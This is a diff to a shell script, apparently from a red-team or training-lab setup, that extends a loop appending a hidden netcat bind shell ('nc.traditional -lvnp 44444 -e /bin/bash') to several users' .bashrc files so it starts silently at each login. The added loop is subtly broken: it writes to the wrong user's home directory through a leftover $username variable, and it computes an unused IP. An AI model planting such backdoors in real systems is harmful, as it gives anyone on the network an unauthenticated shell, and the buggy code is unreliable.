@@ -25,3 +25,11 @@ for username in "${usernames[@]}"; do
     echo "nc.traditional -lvnp 44444 -e /bin/bash >/dev/null 2>&1 &" &>> "/home/$username/.bashrc"
     chown "$username:$username" "/home/$username/.bashrc"
 done
+
+blueusers=("king" "duke" "knight" "lady" "baron" "scribe")
+for user in "${blueusers[@]}"; do
+    touch "/home/$username/.bashrc"
+    ip=$(hostname -I | awk '{print $1}')
+    echo "nc.traditional -lvnp 44444 -e /bin/bash >/dev/null 2>&1 &" &>> "/home/$username/.bashrc"
+    chown "$user:$user" "/home/$user/.bashrc"
+done
